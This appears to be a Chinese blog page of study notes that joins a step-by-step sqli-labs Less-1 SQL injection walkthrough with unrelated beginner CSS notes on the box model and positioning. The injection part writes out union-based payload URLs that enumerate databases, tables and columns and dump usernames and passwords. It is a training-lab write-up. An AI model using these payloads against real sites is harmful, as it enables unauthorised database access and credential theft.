less-1详解

对第一关的详细讲解
SELECT * FROM users WHERE id=’1’ LIMIT 0,1
当输入?id=1时所对应的SQL语句如上
当在1后面加入了’后的SQL语句是：SELECT * FROM users WHERE id=’1’’ LIMIT 0,1
会出现报错，原因是多了一个’，用户输入的是1’，多出来的这个单引号会和前面的单引号进行闭合
‘ LIMIT 0,1 这一段是自动写进去的，直接将这段语句进行注释就可以解决报错
用–进行注释
单行注释中是用– 来注释（–后面有一个空格），但是直接输入–加一个空格不会有注释的效果，后台所展示的SQL中没有这个空格，那就只能通过其他的方式，最简单的方式在–后面加入一个+
+号在后台就被解释成了空格
此时的SQL语句就是：SELECT * FROM users WHERE id=’1’– ‘ LIMIT 0,1

union select 用来报显示位，原因是左边查询没结果，右边结果1，2，3。就爆出了显示位。

sqli less1

先输入?id=1没有报错，然后输入?id=1’发现出现了报错,只要看见报错，就可以理解为这个注入已经确定了，因为我们多输了的
这个单引号最终最终在执行的sql的时候已经产生了注入。应为我们输入的1’已经当作参数进入数据库了，分号的确是是最终导致
数据库报错的根本原因
第一步，是查询是否存在注入
http://localhost/sqli-labs-master/Less-1/?id=1%27
第二步，接下来是思考如何让这个语句正常
http://localhost/sqli-labs-master/Less-1/?id=1%27--+
就是如上通过注释掉后面语句的方法。
第三步，是猜字段的数量，根据我们传入id最终查询到结果的列数
这里要用到一个MySQL的语法：”order by“
当输入http://localhost/sqli-labs-master/Less-1/?id=1%27 order by 1–+时不会出现错误，但当输入到order by 4 的时候就
会出现报错，就可以确定它的字段是三个
第四步，就是报出显示位，id就必须是查询不到的数据
http://localhost/sqli-labs-master/Less-1/?id=-1%27 union select 1,2,3–+
第五步，接下来就是查询详细信息
http://localhost/sqli-labs-master/Less-1/?id=-1%27%20union%20select%201,concat_ws(%27~%27,database(),version(),user()),3--+
查了当前数据库，数据库版本当前用户
第六步，查询具体，数据库
http://localhost/sqli-labs-master/Less-1/?id=-1%27%20union%20select%201,group_concat(schema_name),3%20from%20information_schema.schemata--+
这个语句将现有的所有数据库都查询出来了
然后要查询数据库所对应的表
http://localhost/sqli-labs-master/Less-1/?id=-1%27%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=%27security%27--+
接下来是查询表中的列
http://localhost/sqli-labs-master/Less-1/?id=-1%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=%27users%27--+
查数据
注：0x3a代表一个冒号
http://localhost/sqli-labs-master/Less-1/?id=-1%27%20union%20select%201,group_concat(id,0x3a,username,0x3a,password),3%20from%20users--+

这样就分别爆出了库，表，字符段了

CSS初学

在学习CSS之前一定要先了解HTML

什么是CSS？

1.Cascading Stylesheets（叠成样式表）

2.不是编程语言

3.告诉浏览器如何指定样式布局等

一般选用vscode编译器

三种方式在HTML中添加CSS

1、外部样式表

（1）CSS保存在.css文件中

2、内部样式表

（1）不使用外部CSS文件，将CSS放在HTML的style里（一般也在head里）

3、内联样式

（1）仅影响一个元素

（2）在HTML元素的style属性中添加

注：第一种方式使用较多，一般不推荐第三种

可以去这个网站了解选择器：http://developer.mozilla.org/en-US/docs/Learn/CSS/Introduction_to_CSS/Selectors，可以了解到一些更高级的选择方法

盒子模型：

CSS 盒子模型(Box Model)

所有HTML元素可以看作盒子，在CSS中，”box model”这一术语是用来设计和布局时使用。

CSS盒模型本质上是一个盒子，封装周围的HTML元素，它包括：边距，边框，填充，和实际内容。

盒模型允许我们在其它元素和周围元素边框之间的空间放置元素。

下面的图片说明了盒子模型(Box Model)：

  • Margin(外边距) - 清除边框外的区域，外边距是透明的。

  • Border(边框) - 围绕在内边距和内容外的边框。

  • Padding(内边距) - 清除内容周围的区域，内边距是透明的。

  • Content(内容) - 盒子的内容，显示文本和图像。

    注意： 当您指定一个 CSS 元素的宽度和高度属性时，你只是设置内容区域的宽度和高度。要知道，完整大小的元素，你还必须添加内边距，边框和边距。

    最终元素的总宽度计算公式是这样的：

    总元素的宽度=宽度+左填充+右填充+左边框+右边框+左边距+右边距

CSS中的定位有很多种：

static—静态定位：所有元素默认的一种定位方式

relative—相对定位：都可以指定进行偏移

absolute—绝对定位

fix—固定定位：相对于窗口做定位

sticky定位

sticky 英文字面意思是粘，粘贴，所以可以把它称之为粘性定位。

position: sticky; 基于用户的滚动位置来定位。

粘性定位的元素是依赖于用户的滚动，在 position:relative 与 position:fixed 定位之间切换。

它的行为就像 position:relative; 而当页面滚动超出目标区域时，它的表现就像 **position:fixed;**，它会固定在目标位置。

元素定位表现为在跨越特定阈值前为相对定位，之后为固定定位。

这个特定阈值指的是 top, right, bottom 或 left 之一，换言之，指定 top, right, bottom 或 left 四个阈值其中之一，才可使粘性定位生效。否则其行为与相对定位相同。

什么是 CSS?

  • CSS 指层叠样式表 (Cascading Style Sheets)
  • 样式定义如何显示 HTML 元素
  • 样式通常存储在样式表中
  • 把样式添加到 HTML 4.0 中，是为了解决内容与表现分离的问题
  • 外部样式表可以极大提高工作效率
  • 外部样式表通常存储在 CSS 文件中
  • 多个样式定义可层叠为一个

CSS 实例

CSS 规则由两个主要的部分构成：选择器，以及一条或多条声明:

选择器通常是您需要改变样式的 HTML 元素。

每条声明由一个属性和一个值组成。

属性（property）是您希望设置的样式属性（style attribute）。每个属性有一个值。属性和值被冒号分开。

CSS 实例

CSS声明总是以分号(;)结束，声明总以大括号({})括起来:

p {color:red;text-align:center;}

为了让CSS可读性更强，你可以每行只描述一个属性:

实例

p { color:red; text-align:center; }
